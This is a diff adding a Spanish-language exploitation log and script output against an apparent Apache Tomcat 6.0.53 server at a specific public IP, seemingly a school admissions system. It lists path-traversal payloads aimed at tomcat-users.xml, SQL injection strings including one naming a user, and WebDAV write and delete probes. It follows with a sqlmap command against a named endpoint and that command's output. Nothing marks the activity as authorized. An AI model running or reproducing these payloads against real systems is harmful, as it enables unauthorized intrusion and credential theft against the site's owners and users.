@@ -1,0 +1,63 @@
+Script Corregido para Extracción Real:
+
+======================================================================
+EXPLOTACIÓN AVANZADA TOMCAT 6.0.53
+======================================================================
+[+] Intentando extracción real de archivos...
+🔍 Probando: /examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml
+🔍 Probando: /examples/jsp/include/include.jsp?file=../../../../conf/tomcat-users.xml
+🔍 Probando: /examples/jsp/include/include.jsp?url=file:///conf/tomcat-users.xml
+🔍 Probando: /examples/jsp/include/include.jsp?path=../../../../conf/tomcat-users.xml
+🔍 Probando: /examples/jsp/include/include.jsp?page=..\..\..\..\conf\tomcat-users.xml
+🔍 Probando: /examples/jsp/cal/cal2.jsp?time=....//....//....//....//conf/tomcat-users.xml
+🔍 Probando: /examples/jsp/snp/snoop.jsp?param=../../../../conf/tomcat-users.xml
+🔐 Probando encoded: /examples/jsp/include/include.jsp?page=....%2f....%2f....%2f....%2fconf%2ftomcat-users.xml
+🔐 Probando encoded: /examples/jsp/include/include.jsp?page=..%252f..%252f..%252f..%252fconf%252ftomcat-users.xml
+
+[+] Explotando JSP samples para info del sistema...
+📊 /examples/jsp/snp/snoop.jsp - Accesible
+🔍 /examples/jsp/snp/snoop.jsp - ip_address: Remote address: 189.254.143.102
+
+📊 /examples/jsp/jsp2/el/basic-arithmetic.jsp - Accesible
+
+[+] Fuerza bruta con patrones UTSLP...
+
+[+] Analizando aplicación SITO...
+🚨 Posible SQLi exitoso: admin' OR '1'='1'--
+🚨 Posible SQLi exitoso: hnieto' OR 1=1--
+🚨 Posible SQLi exitoso: ' UNION SELECT 1,2,3--
+🚨 Posible SQLi exitoso: admin' AND 1=1--
+
+[+] Probando WebDAV...
+🔧 PUT http://189.254.143.102/webdav/ - Status: 404
+🔧 DELETE http://189.254.143.102/webdav/ - Status: 404
+🔧 PROPFIND http://189.254.143.102/webdav/ - Status: 404
+🔧 MKCOL http://189.254.143.102/webdav/ - Status: 404
+🔧 PUT http://189.254.143.102/dav/ - Status: 404
+🔧 DELETE http://189.254.143.102/dav/ - Status: 404
+🔧 PROPFIND http://189.254.143.102/dav/ - Status: 404
+🔧 MKCOL http://189.254.143.102/dav/ - Status: 404
+🔧 PUT http://189.254.143.102/examples/webdav/ - Status: 404
+🔧 DELETE http://189.254.143.102/examples/webdav/ - Status: 404
+🔧 PROPFIND http://189.254.143.102/examples/webdav/ - Status: 404
+🔧 MKCOL http://189.254.143.102/examples/webdav/ - Status: 404
+
+======================================================================
+RECOMENDACIONES INMEDIATAS:
+1. Los archivos XML se están procesando como HTML
+2. Intentar métodos de encoding alternativos
+3. Probar LFI con wrappers: php://filter, expect://
+4. Buscar archivos de backup: .bak, .old, .backup
+======================================================================
+
+Script Específico para Extraer Credenciales Tomcat:
+
+
+
+sqlmap -u "http://189.254.143.102/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1" --dbs
+
+[22:42:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:42:53] [WARNING] GET parameter 'xCveBachillerato' does not seem to be injectable
+[22:42:53] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[22:42:53] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 72 times
